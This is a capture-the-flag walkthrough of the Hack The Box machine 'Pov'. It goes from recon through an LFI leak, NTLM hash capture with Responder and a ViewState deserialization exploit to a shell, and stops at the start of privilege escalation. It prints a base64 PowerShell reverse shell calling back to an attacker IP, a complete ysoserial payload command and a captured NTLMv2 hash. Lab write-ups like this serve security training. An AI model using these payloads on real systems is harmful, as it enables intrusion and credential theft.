---
description: 'IP: 10.10.11.251'
cover: ../.gitbook/assets/Pov.png
coverY: 338.72222222222223
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 🟨 POV

## RECON

### Nmap&#x20;

nmap reveals that only port 80 is open. That is kinda strange for a typical machine seen on HTB. Most of the boxes tend to open port 22 (or commonly refer as SSH) as a way to remote access as user or root. The usual approach would be to grab the creds through some nefarious ways then log in SSH creds.  &#x20;

```

map -sV -sC -v -T4 10.10.11.251

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### FFUF

Using ffuf to search for subdomains that respond different with code 200/300

```
ffuf -c -u http://pov.htb -H "Host: FUZZ.pov.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac -mc all


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pov.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.pov.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

dev                     [Status: 302, Size: 152, Words: 9, Lines: 2, Duration: 476ms]
:: Progress: [19966/19966] :: Job [1/1] :: 153 req/sec :: Duration: [0:02:13] :: Errors: 0 ::

```

Only 1 subdomain returns 302 - dev. Let add it into /etc/hosts.



## GAINING FOOTHOLD

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 022813.png" alt=""><figcaption><p>Image taken from dev.pov.htb</p></figcaption></figure>

`pov.htb` provides no indication of a possible attack vector. However, in `dev.pov.htb`, I stumbled upon LFI (Local File Incursion) when examining the parameters in the intercepted package in Burpsuite while tinkering with the web download function.

{% hint style="info" %}
**File Inclusion** vulnerability allows an attacker to include a file, usually exploiting a “dynamic file inclusion” mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.

This can lead to something as outputting the contents of the file, but depending on the severity, it can also lead to:

* Code execution on the web server
* Code execution on the client-side such as JavaScript which can lead to other attacks such as cross site scripting (XSS)
* Denial of Service (DoS)
* Sensitive Information Disclosure
{% endhint %}

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 024013.png" alt=""><figcaption><p>Jackpot!</p></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 023536.png" alt=""><figcaption><p>Finding interesting data when navigating back to the machine's hosts file</p></figcaption></figure>

It took some time to find a few intriguing files:

* `default.aspx`
* `web.config`
* `contact.aspx`



### LFI & Responder&#x20;

Now what we are going to do here is we are going to capture the NTLM hash by using Responder

{% hint style="info" %}
Responder will poison MDNS, NBT-NS, and LLMNR.\
\
And you might be asking?

What is LLMNR, NBT-NS, MDNS?\
\
The functions of the protocols LLMNR, NBT-NS, and MDNS are nearly identical.&#x20;

* Based on the Domain Name System packet format, LLMNR (Link-Local Multicast Name Resolution) is a protocol that supports all current and upcoming DNS formats, types, and classes and permits IPv4 and IPv6 hosts.
* A Net BIOS protocol called NBT-NS (Net BIOS Name Service) is used on Windows OS to convert NetBIOS names to IP addresses.
* Finally, all of the network's participants are addressed directly via the MDNS (Multicast Domain Name Service) protocol.\


If reading this is too tedious for you, just know that, Responder would attempt to obtain your NTLM hashes from the network in plain text. If you're lucky, this tool might give you a clear text username and password in addition to the password hash.
{% endhint %}

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 023514.png" alt=""><figcaption><p>Crafting a payload for Responder to catch!</p></figcaption></figure>

`file=%5C%5C10.10.X.X%5Csomefile`&#x20;

Our payload basically is \\\10.10.X.X\somefile wrap in URL encoding.

```
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.36]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-71DF2WLMSKI]
    Responder Domain Name      [4SLY.LOCAL]
    Responder DCE-RPC Port     [45254]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.251
[SMB] NTLMv2-SSP Username : POV\sfitz
[SMB] NTLMv2-SSP Hash     : sfitz::POV:b278d4805eceb79a:EF1631875F43CC4ED3C17B5CDC1F7A2C:0101000000000000000D8D632353DA01450CA76A8DE1A6B50000000002000800340053004C00590001001E00570049004E002D003700310044004600320057004C004D0053004B00490004003400570049004E002D003700310044004600320057004C004D0053004B0049002E00340053004C0059002E004C004F00430041004C0003001400340053004C0059002E004C004F00430041004C0005001400340053004C0059002E004C004F00430041004C0007000800000D8D632353DA0106000400020000000800300030000000000000000000000000200000B88F093AADA8A3DF9CD6AEC53146F0CE440FC2D95BEFB24CF577D47A1108E1920A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330036000000000000000000

```

And this is the dead end because this hash is uncrackable.&#x20;



### ViewState Deserialization Exploit

#### An overview of the approach

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 024507.png" alt=""><figcaption><p>Taking a look at web.config reveals some juicy info</p></figcaption></figure>

So let's talk about ViewState for a little bit:

The `ASP.NET` framework's default method for maintaining page and control values across web pages is called `ViewState`. The current state of the page and any values that must be kept during postback are serialized into base64-encoded strings and output in the `ViewState` hidden field or fields when the HTML for the page is rendered.&#x20;

> Because of its connection to the way `ASP.NET` handles `ViewState` creation and processing through the use of the `ObjectStateFormatter` for serialization and deserialization, `ViewState` by itself isn't a problem; rather, `ASP.NET`'s encryption and signature for serialized data could be compromised.

Attackers could create malicious payloads that imitate authentic `ViewState` by taking advantage of deserialization flaws in `ObjectStateFormatter`, thanks to exposed algorithms or keys.

\-> In this case, we could leverage the leak of encryption and signature keys obtained from `web.config` file.

<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption><p>A list of scenarios where ViewState Deserialization flaws could be exploited</p></figcaption></figure>

Luckily, the `.NET` deserialization tool [ysoserial](https://github.com/pwntester/ysoserial.net) includes a `ViewState`-specific feature. Vulnerabilities in `ObjectStateFormatter` deserialization are caused by its use of known keys and algorithms to impersonate `ViewState` encryption and signatures.

#### Cracking the nut

With ASP.NET framework ≥ 4.5, we need to supply the _decryption algorithm_ and the _decryption key_ to the ysoserial:

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 010341.png" alt=""><figcaption><p>Crafting a serialized payload</p></figcaption></figure>

In this example, we will be using a simple PowerShell Reverse Shell encoded in Base64:

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Then, serialized it by `ysoserial` : &#x20;

```
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "PAYLOAD_IN_HERE" --path="/portfolio/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="AES_KEY" --validationalg="SHA1" --validationkey="SHA1_KEY"
```

Finally, after replacing the URL encoded value of the generated payload with the value of the \_\_VIEWSTATE in the above-mentioned request, our payload will be executed.

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 011654 (1).png" alt=""><figcaption><p>Plug-in our payload!</p></figcaption></figure>

Now, we have gained a shell as `POV/sfitz`

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption><p>Got da shell!!</p></figcaption></figure>

## PRIVILEGE ESCALATION <a href="#privilege-escalation" id="privilege-escalation"></a>

After a bit of exploring, I find this file:

<figure><img src="../.gitbook/assets/Screenshot 2024-01-30 012116.png" alt=""><figcaption></figcaption></figure>
